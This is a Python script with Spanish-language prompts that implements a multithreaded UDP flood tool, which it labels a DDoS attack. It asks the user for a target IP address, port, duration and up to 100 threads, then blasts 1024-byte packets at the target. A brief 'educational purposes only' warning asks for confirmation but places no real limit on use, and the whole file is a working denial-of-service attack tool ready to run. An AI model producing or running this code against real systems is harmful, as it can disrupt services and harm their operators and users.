import socket
import threading
import time
from colorama import Fore, Style

def mostrar_advertencia():
    print(Fore.RED + """\n[!] ADVERTENCIA: Esta herramienta es solo para fines educativos.
    El uso indebido de esta herramienta puede ser ilegal.
    El usuario asume toda la responsabilidad por su uso.""" + Style.RESET_ALL)
    confirmacion = input(Fore.YELLOW + "\n¿Desea continuar? (s/n): " + Style.RESET_ALL).lower()
    return confirmacion == 's'

def validar_puerto(puerto):
    try:
        puerto = int(puerto)
        return 1 <= puerto <= 65535
    except ValueError:
        return False

def ddos_attack(target, port, duration):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_payload = bytes([x % 256 for x in range(1024)])  # Asegura que los valores estén en el rango 0-255
        timeout = time.time() + duration
        packets_sent = 0

        while time.time() < timeout:
            try:
                sock.sendto(bytes_payload, (target, port))
                packets_sent += 1
            except socket.error as e:
                print(Fore.YELLOW + f"\n[!] Error al enviar paquete: {str(e)}" + Style.RESET_ALL)
                continue
            
        print(Fore.CYAN + f"\n[*] Paquetes enviados: {packets_sent}" + Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f"\n[!] Error en el ataque: {str(e)}" + Style.RESET_ALL)
    finally:
        if 'sock' in locals():
            sock.close()

def ejecutar_ddos():
    if not mostrar_advertencia():
        return

    try:
        target = input(Fore.GREEN + "\n>_ Ingrese la dirección IP objetivo: " + Style.RESET_ALL)
        port = input(Fore.GREEN + ">_ Ingrese el puerto (1-65535): " + Style.RESET_ALL)
        
        if not validar_puerto(port):
            print(Fore.RED + "\n[!] Puerto inválido" + Style.RESET_ALL)
            return
        
        port = int(port)
        duration = float(input(Fore.GREEN + ">_ Ingrese la duración del ataque en segundos: " + Style.RESET_ALL))
        threads = int(input(Fore.GREEN + ">_ Ingrese el número de hilos (1-100): " + Style.RESET_ALL))
        
        if not 1 <= threads <= 100:
            print(Fore.RED + "\n[!] Número de hilos inválido" + Style.RESET_ALL)
            return

        print(Fore.YELLOW + "\n[*] Iniciando ataque DDoS..." + Style.RESET_ALL)
        thread_list = []

        for _ in range(threads):
            thread = threading.Thread(target=ddos_attack, args=(target, port, duration))
            thread_list.append(thread)
            thread.start()

        for thread in thread_list:
            thread.join()

        print(Fore.GREEN + "\n[✓] Ataque completado" + Style.RESET_ALL)

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[*] Ataque interrumpido por el usuario" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {str(e)}" + Style.RESET_ALL)